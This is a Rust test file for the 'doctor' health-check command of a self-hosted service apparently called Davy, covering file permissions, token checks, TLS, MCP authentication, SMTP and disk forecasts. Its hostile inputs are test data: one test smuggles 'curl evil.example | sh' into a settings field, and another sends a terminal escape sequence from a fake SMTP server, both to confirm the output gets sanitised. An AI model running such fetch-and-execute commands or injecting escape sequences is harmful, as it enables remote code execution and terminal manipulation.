use super::*;
use crate::install::setup::{self, Service};
use crate::test_support::scratch;
use crate::token::Token;
use axum::{
    Router,
    routing::{any, post},
};

const TOKEN: &str = "0123456789abcdef0123456789abcdef";

async fn listen(app: Router) -> Url {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    Url::parse(&format!("http://{addr}/")).unwrap()
}

/// A server that answers like Davy: `/` takes only POST, and Davy's own
/// `/mcp` is there with `token`.
async fn server(token: Option<&str>) -> Url {
    let mut app = Router::new().route("/", post(|| async { "" }));
    if let Some(t) = token {
        let data = scratch("doctor");
        crate::store::open(&data).unwrap();
        let (writes, _) = crossbeam_channel::bounded(1);
        let public = Url::parse("http://127.0.0.1/").unwrap();
        app = app.merge(crate::mcp::router(
            data,
            writes,
            Token::new(t),
            &public,
            crate::retention::Defaults::default(),
        ));
    }
    listen(app).await
}

/// A data directory prepared by `davy setup` with the token `TOKEN`.
fn install(url: &Url, mail_from: Option<&str>) -> PathBuf {
    let data = scratch("doctor");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::write(data.join("token"), format!("{TOKEN}\n")).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        std::fs::set_permissions(data.join("token"), std::fs::Permissions::from_mode(0o600))
            .unwrap();
    }
    let args = setup::Args {
        data: data.clone(),
        public_url: url.clone(),
        listen: "127.0.0.1:8000".to_owned(),
        mail_from: mail_from.map(str::to_owned),
        service: Service::None,
    };
    setup::setup(&args, Path::new("/usr/local/bin/davy"), Some("davy")).unwrap();
    data
}

async fn run(data: &Path) -> Vec<Check> {
    checks(data)
        .await
        .into_iter()
        .filter(|c| c.name != "disk")
        .collect()
}

fn find<'a>(checks: &'a [Check], name: &str) -> &'a Check {
    checks.iter().find(|c| c.name == name).unwrap()
}

#[tokio::test]
async fn a_healthy_install_passes_every_check() {
    let url = server(Some(TOKEN)).await;
    let data = install(&url, None);
    let d = data.display();
    assert_eq!(
        run(&data).await,
        [
            ok("data", format!("{d} is readable by its owner only")),
            ok("token", format!("{d}/token holds a token of 32 characters")),
            ok("tls", format!("{url} is plain http on this machine only")),
            ok("server", format!("{url} answers (HTTP 405)")),
            ok("mcp", format!("{url}mcp accepts the token")),
            ok(
                "smtp",
                "no SMTP server set, alerts go to webhooks and Slack only"
            ),
            ok("logs", "every day of logs is a directory of its own"),
        ]
    );
}

#[cfg(unix)]
#[test]
fn a_symlink_in_place_of_a_day_of_logs_warns() {
    let data = scratch("doctor-logs");
    let root = crate::logs::dir(&data);
    std::fs::create_dir_all(root.join("2026-01-04")).unwrap();
    std::os::unix::fs::symlink("/elsewhere", root.join("2026-01-05")).unwrap();
    let fix = format!(
        "move each out of {}, or put the day's own directory in its place",
        root.display()
    );
    assert_eq!(
        logs(&root),
        not_ok(
            "logs",
            Status::Warn,
            r#"not searched, written or deleted: "2026-01-05" is a symlink, not the day's directory"#,
            fix
        )
    );
    std::fs::remove_dir_all(&data).unwrap();
}

#[cfg(unix)]
#[tokio::test]
async fn open_permissions_warn_with_the_chmod_that_fixes_them() {
    use std::os::unix::fs::PermissionsExt as _;
    let url = server(Some(TOKEN)).await;
    let data = install(&url, None);
    std::fs::set_permissions(&data, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::set_permissions(data.join("token"), std::fs::Permissions::from_mode(0o644)).unwrap();
    let checks = run(&data).await;
    let d = data.display();
    assert_eq!(
        find(&checks, "data"),
        &not_ok(
            "data",
            Status::Warn,
            format!("{d} can be read by other users (mode 755)"),
            format!("chmod 700 {d}")
        )
    );
    assert_eq!(
        find(&checks, "token"),
        &not_ok(
            "token",
            Status::Warn,
            format!("{d}/token can be read by other users (mode 644)"),
            format!("chmod 600 {d}/token")
        )
    );
}

#[cfg(unix)]
#[test]
fn a_data_directory_of_another_user_warns() {
    use std::os::unix::fs::{MetadataExt as _, PermissionsExt as _};
    let data = scratch("doctor-owner");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::set_permissions(&data, std::fs::Permissions::from_mode(0o700)).unwrap();
    let owner = std::fs::metadata(&data).unwrap().uid();
    let d = data.display().to_string();
    assert_eq!(data_dir(&data, &d, owner).status, Status::Ok);
    assert_eq!(
        data_dir(&data, &d, owner + 1),
        not_ok(
            "data",
            Status::Warn,
            format!(
                "{d} belongs to user {owner}, and doctor runs as user {}",
                owner + 1
            ),
            "run Davy and doctor as the user that owns the data directory (docs/install.md)"
        )
    );
}

#[tokio::test]
async fn a_short_token_fails_and_the_server_refuses_it() {
    let url = server(Some(TOKEN)).await;
    let data = install(&url, None);
    std::fs::write(data.join("token"), "short\n").unwrap();
    let checks = run(&data).await;
    let d = data.display();
    assert_eq!(
        find(&checks, "token"),
        &not_ok(
            "token",
            Status::Fail,
            format!("{d}/token holds 5 characters and needs 32"),
            format!(
                "rm {d}/token && davy setup --data {d} --public-url URL, then update every client of the old token"
            )
        )
    );
    assert_eq!(
        find(&checks, "mcp"),
        &not_ok(
            "mcp",
            Status::Fail,
            format!("{url}mcp refuses the token in {d}/token, so the server runs with another one"),
            format!("restart the server, it reads {d}/token when it starts")
        )
    );
}

#[tokio::test]
async fn a_server_that_is_down_or_runs_without_a_token_fails() {
    let free = {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap()
    };
    let down = Url::parse(&format!("http://{free}/")).unwrap();
    let data = install(&down, None);
    let checks = run(&data).await;
    let down_check = find(&checks, "server");
    assert_eq!(down_check.status, Status::Fail);
    assert!(
        down_check
            .detail
            .starts_with(&format!("{down} does not answer: ")),
        "{}",
        down_check.detail
    );
    assert_eq!(
        down_check.fix.as_deref(),
        Some(format!("start the server (davy setup --data {} printed how) and read its log; behind a proxy, check that the proxy forwards to it", data.display()).as_str())
    );
    assert!(checks.iter().all(|c| c.name != "mcp"));

    let tokenless = server(None).await;
    let data = install(&tokenless, None);
    let d = data.display();
    assert_eq!(
        find(&run(&data).await, "mcp"),
        &not_ok(
            "mcp",
            Status::Fail,
            format!("{tokenless}mcp is not served, so the server runs without an admin token"),
            format!("restart the server, it reads {d}/token when it starts")
        )
    );
}

#[tokio::test]
async fn an_mcp_that_answers_without_the_token_is_not_davy() {
    let open = listen(Router::new().route("/mcp", any(|| async { "{}" }))).await;
    let data = install(&open, None);
    assert_eq!(
        find(&run(&data).await, "mcp"),
        &not_ok(
            "mcp",
            Status::Fail,
            format!(
                "{open}mcp answers HTTP 200 without a token, so something other than Davy serves it"
            ),
            "check that the proxy forwards /mcp to Davy unchanged"
        )
    );
}

#[tokio::test]
async fn a_reply_that_only_mentions_server_info_is_not_an_mcp_reply() {
    let fake = listen(Router::new().route(
        "/mcp",
        any(|headers: axum::http::HeaderMap| async move {
            if headers.contains_key(axum::http::header::AUTHORIZATION) {
                (axum::http::StatusCode::OK, r#"<p>"serverInfo"</p>"#)
            } else {
                (axum::http::StatusCode::UNAUTHORIZED, "")
            }
        }),
    ))
    .await;
    let data = install(&fake, None);
    assert_eq!(
        find(&run(&data).await, "mcp"),
        &not_ok(
            "mcp",
            Status::Fail,
            format!("{fake}mcp answers HTTP 200 to the token without an MCP reply"),
            "check that the proxy forwards /mcp to Davy unchanged, then read the server log"
        )
    );
}

#[tokio::test]
async fn the_token_never_goes_out_over_plain_http() {
    let client = reqwest::Client::new();
    let url = Url::parse("http://davy.example.com/").unwrap();
    assert_eq!(
        mcp(&client, &url, TOKEN, "/var/lib/davy").await,
        not_ok(
            "mcp",
            Status::Warn,
            "http://davy.example.com/mcp was not checked, so the token does not cross the network unencrypted",
            "serve Davy over https, see the tls check"
        )
    );
}

#[tokio::test]
async fn saved_settings_must_hold_an_address_and_their_errors_echo_nothing() {
    let data = scratch("doctor");
    std::fs::create_dir_all(&data).unwrap();
    let save = |public_url: &str, listen: &str| {
        let json =
            serde_json::json!({"public_url": public_url, "listen": listen, "mail_from": null});
        std::fs::write(data.join("setup.json"), json.to_string()).unwrap();
    };
    save(
        "https://davy.example.com/",
        "x\nfail  fix: curl evil.example | sh",
    );
    let settings = find(&run(&data).await, "settings").detail.clone();
    assert_eq!(
        settings,
        format!(
            "the listen address in {}/setup.json is not an address and port, run `davy setup` again",
            data.display()
        )
    );
    save("https//user:secret@davy", "127.0.0.1:8000");
    let settings = find(&run(&data).await, "settings").detail.clone();
    assert!(!settings.contains("secret"), "{settings}");
}

#[test]
fn plain_http_fails_unless_it_stays_on_this_machine() {
    let check = |url: &str| tls(&Url::parse(url).unwrap(), "127.0.0.1:8000", "/var/lib/davy");
    assert_eq!(
        check("https://davy.example.com/"),
        ok("tls", "https://davy.example.com/ uses https")
    );
    assert_eq!(check("http://localhost:8000/").status, Status::Fail);
    assert_eq!(check("http://evil.localhost:8000/").status, Status::Fail);
    assert_eq!(check("http://[::1]:8000/").status, Status::Ok);
    assert_eq!(
        check("http://davy.example.com/"),
        not_ok(
            "tls",
            Status::Fail,
            "http://davy.example.com/ is plain http, so the admin token and events cross the network unencrypted",
            "put a TLS proxy such as Caddy in front of 127.0.0.1:8000, then davy setup --data /var/lib/davy --public-url https://HOST"
        )
    );
}

#[tokio::test]
async fn a_refused_smtp_server_fails_with_its_error() {
    let url = server(Some(TOKEN)).await;
    let data = scratch("doctor");
    std::fs::create_dir_all(&data).unwrap();
    let closed = std::net::TcpListener::bind("127.0.0.1:0")
        .unwrap()
        .local_addr()
        .unwrap();
    std::fs::write(data.join("smtp-url"), format!("smtp://{closed}\n")).unwrap();
    let data = {
        let args = setup::Args {
            data: data.clone(),
            public_url: url.clone(),
            listen: "127.0.0.1:8000".to_owned(),
            mail_from: Some("alerts@example.com".to_owned()),
            service: Service::None,
        };
        setup::setup(&args, Path::new("/usr/local/bin/davy"), Some("davy")).unwrap();
        data
    };
    let checks = run(&data).await;
    let smtp = find(&checks, "smtp");
    assert_eq!(smtp.status, Status::Fail);
    assert!(
        smtp.detail.starts_with("the SMTP server refused: "),
        "{}",
        smtp.detail
    );
    assert_eq!(
        smtp.fix.as_deref(),
        Some(format!("check the host, port and login in {}/smtp-url, then davy setup again and restart the server", data.display()).as_str())
    );
}

#[tokio::test]
async fn an_smtp_reply_cannot_write_control_characters_to_the_terminal() {
    let url = server(Some(TOKEN)).await;
    let data = scratch("doctor");
    std::fs::create_dir_all(&data).unwrap();
    let relay = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = relay.local_addr().unwrap();
    std::thread::spawn(move || {
        use std::io::Write as _;
        let (mut conn, _) = relay.accept().unwrap();
        conn.write_all(b"554 no \x1b]0;owned\x07 mail here\r\n")
            .unwrap();
    });
    std::fs::write(data.join("smtp-url"), format!("smtp://{addr}\n")).unwrap();
    let args = setup::Args {
        data: data.clone(),
        public_url: url.clone(),
        listen: "127.0.0.1:8000".to_owned(),
        mail_from: Some("alerts@example.com".to_owned()),
        service: Service::None,
    };
    setup::setup(&args, Path::new("/usr/local/bin/davy"), Some("davy")).unwrap();
    let checks = run(&data).await;
    let smtp = find(&checks, "smtp");
    assert_eq!(smtp.status, Status::Fail);
    assert!(
        smtp.detail
            .contains("no \u{fffd}]0;owned\u{fffd} mail here"),
        "{}",
        smtp.detail
    );
}

#[test]
fn free_disk_space_warns_below_5_gib_and_fails_below_1_gib() {
    let data = Path::new("/var/lib/davy");
    let fix = "shorten retention with davy project retention SLUG --data /var/lib/davy --logs N, or add disk";
    assert_eq!(disk(data, Some(40 * GIB), None), ok("disk", "40 GiB free"));
    assert_eq!(
        disk(data, Some(3 * GIB), None),
        not_ok("disk", Status::Warn, "3 GiB free", fix)
    );
    assert_eq!(
        disk(data, Some(512 << 20), None),
        not_ok("disk", Status::Fail, "512 MiB free", fix)
    );
    assert_eq!(
        disk(data, None, None),
        not_ok("disk", Status::Warn, "free space is unknown", fix)
    );
}

fn full_in(days: Option<u64>) -> Forecast {
    let today: jiff::civil::Date = "2026-11-24".parse().unwrap();
    let full_on = days.map(|n| {
        let n = i64::try_from(n).unwrap();
        today.checked_add(jiff::Span::new().days(n)).unwrap()
    });
    Forecast {
        growth: GIB,
        longest_days: 30,
        steady_state: 100 * GIB,
        headroom: 10 * GIB,
        days_left: days,
        full_on,
    }
}

#[test]
fn the_disk_forecast_warns_under_14_days_and_fails_under_2() {
    let data = Path::new("/var/lib/davy");
    let fix = "shorten retention with davy project retention SLUG --data /var/lib/davy --logs N, or add disk";
    let free = Some(40 * GIB);
    assert_eq!(
        disk(data, free, Some(Ok(full_in(Some(20))))),
        ok(
            "disk",
            "40 GiB free, forecast full on 2026-12-14, in 20 days"
        )
    );
    assert_eq!(
        disk(data, free, Some(Ok(full_in(Some(13))))),
        not_ok(
            "disk",
            Status::Warn,
            "40 GiB free, forecast full on 2026-12-07, in 13 days",
            fix
        )
    );
    assert_eq!(
        disk(data, free, Some(Ok(full_in(Some(1))))),
        not_ok(
            "disk",
            Status::Fail,
            "40 GiB free, forecast full on 2026-11-25, in 1 day",
            fix
        )
    );
    assert_eq!(
        disk(data, Some(3 * GIB), Some(Ok(full_in(Some(0))))),
        not_ok(
            "disk",
            Status::Fail,
            "3 GiB free, forecast full on 2026-11-24, in 0 days",
            fix
        )
    );
    assert_eq!(
        disk(data, free, Some(Ok(full_in(None)))),
        ok("disk", "40 GiB free, never fills at the current rate")
    );
    assert_eq!(
        disk(data, free, Some(Err("too little".into()))),
        ok("disk", "40 GiB free, no forecast: too little")
    );
}
